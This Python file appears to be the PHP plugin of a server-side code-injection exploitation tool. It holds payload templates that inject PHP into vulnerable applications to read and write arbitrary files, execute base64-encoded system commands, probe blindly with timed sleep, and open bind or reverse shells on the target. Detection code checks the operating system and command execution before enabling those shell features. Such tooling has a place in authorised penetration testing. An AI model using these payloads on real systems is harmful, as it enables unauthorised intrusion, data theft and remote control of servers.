from utils.strings import quote, chunkit, md5
from utils.loggers import log
from plugins.languages import bash
from core.plugin import Plugin
from utils import closures
from utils import rand
import base64
import re


class Php(Plugin):


    def language_init(self):

        self.update_actions({
                'render' : {
                'call': 'inject',
                'render': """%(code)s""",
                'header': """print_r('%(header)s');""",
                'trailer': """print_r('%(trailer)s');""",
                'test_render': 'print(%(r1)s);' % { 
                    'r1' : rand.randints[0]
                },
                'test_render_expected': '%(r1)s' % { 
                    'r1' : rand.randints[0]
                }
            },
            'write' : {
                'call' : 'evaluate',
                'write' : """$d="%(chunk_b64)s"; file_put_contents("%(path)s", base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)),FILE_APPEND);""",
                'truncate' : """file_put_contents("%(path)s", "");"""
            },
            'read' : {
                'call': 'evaluate',
                'read' : """print(base64_encode(file_get_contents("%(path)s")));"""
            },
            'md5' : {
                'call': 'evaluate',
                'md5': """is_file("%(path)s") && print(md5_file("%(path)s"));"""
            },
            'evaluate' : {
                'call': 'render',
                'evaluate': """%(code)s"""
            },
            'execute' : {
                'call': 'evaluate',
                'execute': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)));"""
            },
            'blind' : {
                'call': 'evaluate_blind',
                'test_bool_true' : """True""",
                'test_bool_false' : """False"""
            },
            'evaluate_blind' : {
                'call': 'inject',
                'evaluate_blind': """$d="%(code_b64)s";eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)) . ") && sleep(%(delay)i);");"""
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)). " && sleep %(delay)i");"""
            },
            'bind_shell' : {
                'call' : 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell' : {
                'call': 'execute_blind',
                'reverse_shell' : bash.reverse_shell
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },
            
            # This terminates the statement with ;
            { 'level': 1, 'prefix' : '%(closure)s;', 'suffix' : '//', 'closures' : ctx_closures },

            # This does not need termination e.g. if(%s) {}
            { 'level': 2, 'prefix' : '%(closure)s', 'suffix' : '//', 'closures' : ctx_closures },

            # Comment blocks
            { 'level': 5, 'prefix' : '*/', 'suffix' : '/*' },

        ])

    language = 'php'

    def rendered_detected(self):

        os = self.evaluate("""echo PHP_OS;""")
        if os and re.search('^[\w-]+$', os):
            self.set('os', os)
            self.set('evaluate', self.language)
            self.set('write', True)
            self.set('read', True)

            expected_rand = str(rand.randint_n(2))
            if expected_rand == self.execute('echo %s' % expected_rand):
                self.set('execute', True)
                self.set('bind_shell', True)
                self.set('reverse_shell', True)


    def blind_detected(self):

        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)
        
        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)


ctx_closures = {
        1: [
            closures.close_single_duble_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ]
}
